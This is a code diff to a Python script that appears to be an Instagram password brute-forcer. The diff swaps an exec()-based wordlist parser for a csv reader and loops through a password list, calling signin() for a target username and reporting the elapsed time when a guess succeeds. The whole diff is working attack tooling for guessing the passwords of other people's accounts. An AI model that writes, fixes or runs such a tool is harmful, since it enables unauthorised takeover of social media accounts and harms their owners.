@@ -696,7 +696,13 @@ def signin(password,username):
             return True
         else:
             return False
-
+def read(passlist):
+	import csv
+	crimefile = open(passlist, 'r')
+	reader = csv.reader(crimefile)
+	allRows = [row for row in reader]
+	return allRows
+        	
 
 def head(str):
 	print(R+"["+G+">"+R+"] "+C+str)
@@ -704,12 +710,9 @@ def Bruteforce(passlist,username):
     n_words = len(list(open(passlist, "rb")))
     head(f"Total passwords to test: {B}"+ str(n_words))
     print(f"\n{R}║{W} Instagram Id = {G}{username}{W}{R} ║")
-    with open(passlist,"rb") as file:
-        text = str('["'+str(file.read().decode()).replace("\n",'","')[:-2]+']')
-        exec (f"pass_list = {text}")
-        for count,password in enumerate(pass_list):
-            print(f"{Y}[{W}{count+1}/{n_words}{Y}]{C} Testing password : {G}"+password)  
-            trial = signin(password,username)
+    for count,password in enumerate(read(passlist)):
+            print(f"\n\n{Y}[{W}{count+1}/{n_words}{Y}]{C} Testing password : {G}"+"".join(password)) 
+            trial = signin("".join(password),username)
             if trial == True:
                 end = timer()
                 print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	                   	
